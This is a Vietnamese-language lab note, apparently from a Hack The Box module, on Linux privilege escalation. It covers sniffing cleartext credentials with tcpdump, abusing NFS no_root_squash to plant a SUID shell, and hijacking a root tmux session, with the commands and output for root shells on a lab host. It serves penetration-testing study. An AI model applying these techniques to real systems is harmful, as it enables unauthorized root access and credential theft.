## Passive Traffic Capture
Nếu `tcpdump` được cài đặt, người dùng không có đặc quyền có thể có khả năng bắt lưu lượng mạng, trong một số trường hợp có thể bao gồm cả các thông tin xác thực được truyền dưới dạng cleartext. Có một số công cụ như [net-creds](https://github.com/DanMcInerney/net-creds) và [PCredz](https://github.com/lgandx/PCredz) có thể được sử dụng để kiểm tra dữ liệu đang được truyền trên mạng. Điều này có thể dẫn đến việc thu thập các thông tin nhạy cảm như một số thẻ tín dụng và SNMP community string. Cũng có khả năng thu thập được các hash Net-NTLMv2, SMBv2, hoặc Kerberos, sau đó có thể thực hiện office brute force để tìm ra mật khẩu plaintext. Các giao thức truyền dữ liệu dạng cleartext như HTTP, FTP, POP, IMAP, telnet hoặc SMTP có thể chứa thông tin xác thực và những thông tin này có thể được tái sử dụng để leo thang đặc quyền trên host.
## Weak NFS Privileges
Network File System (NFS) cho phép người dùng truy cập các file hoặc thư mục được chia sẻ qua mạng và được lưu trữ trên các hệ thống Unix/Linux. NFS sử dụng TCP/UDP port `2049`. Bất kỳ mount nào có thể truy cập đều có thể được liệt kê từ xa bằng lệnh `showmount -e`, lệnh này liệt kê danh sách các file system được NFS server export, hay access control list đối với các filesystem mà NFS client có thể truy cập.

![[Screenshot 2026-09-11 at 19.54.25.png]]
Khi tạo một NFS volume, có thể thiết lập nhiều tuỳ chọn khác nhau:

| Option           | Description                                                                                                                                                                                                                                                                                   |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | Nếu root user được sử dụng truy cập NFS Share, tài khoản này sẽ được chuyển thành user `nfsnobody`, đây là một tài khoản không có đặc quyền. Bất kỳ file nào được root user tạo hoặc upload sẽ thuộc sở hữu của user `nfsnobody`, ngăn attacker upload các binary có SUID bit được thiết lập. |
| `no_root_squash` | Remote user kết nối tới share với tư cách local root user có khả năng tạo file trên NFS server với quyền root. Điều này cho phép tạo các script hoặc chương trình độc hại có SUID bit được thiết lập.                                                                                         |
![[Screenshot 2026-09-11 at 20.02.34.png]]
Ví dụ, chúng ta có thể tạo một binary có `SETUID` để thực thi `/bin/sh` bằng local root user. Sau đó chúng ta có thể mount thư mục `/tmp` trên máy local, copy binary thuộc sở hữu của root sang NFS server và thiết lập bit.
Đầu tiên, tạo một binary đơn giản, mount thư mục, copy binary sang đó và thiết lập các quyền cần thiết.
![[Screenshot 2026-09-11 at 20.13.29.png]]
Khi chuyển quay lại session của user có đặc quyền thấp trên host mục tiêu, chúng ta có thể thực thi binary để lấy root shell:

```shell
htb@NIX02:/tmp$ ls -la
total 68
drwxrwxrwt 10 root root  4096 Sep  1 06:15 .
drwxr-xr-x 24 root root  4096 Aug 31 02:24 ..
drwxrwxrwt  2 root root  4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root root  4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root root 16712 Sep  1 06:15 shell
<SNIP>
```

```shell
htb@NIX02:/tmp$ ./shell 
root@NIX02:/tmp# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

![[Screenshot 2026-09-11 at 20.39.12.png]]
*Đọc file flag trong thư mục `/var/nfs/general/` sau khi leo thang thành công*

## Hijacking Tmux Sessions
Terminal multiplexers chẳng hạn như [tmux](https://en.wikipedia.org/wiki/Tmux) có thể được sử dụng để cho phép truy cập nhiều terminal session trong một console session duy nhất. Khi không làm việc trong một tmux window, chúng ta có thể detach khỏi session đó mà vẫn để nó tiếp tục hoạt động (ví dụ: đang chạy một nmap scan). Vì nhiều lý do, người dùng có thể để lại một process tmux chạy dưới quyền tài khoản có đặc quyền như `root` nhưng lại được thiết lập với các quyền yếu (weak permissions), dẫn đến việc có thể bị chiếm quyền điều khiển (hijack).

Điều này có thể được thực hiện bằng các lệnh sau để tạo một shared session mới và thay đổi quyền sở hữu:

```shell
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

Nếu chúng ta có thể chiếm được một user nằm trong nhóm `devs`, chúng ta có thể attach vào session này và giành được quyền root.

Kiểm tra các tiến trình tmux đang chạy:

```shell
htb@NIX02:~$ ps aux | grep tmux

root        4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Xác nhận lại quyền hạn (permissions) của socket:

```shell
htb@NIX02:~$ ls -la /shareds

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Kiểm tra group membership của người dùng hiện tại:

```shell
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Cuối cùng, attach vào tmux session và xác nhận quyền `root`:

```shell
htb@NIX02:~$ tmux -S /shareds
```

```shell
# id
uid=0(root) gid=0(root) groups=0(root)
```
![[Screenshot 2026-09-11 at 20.39.12.png]]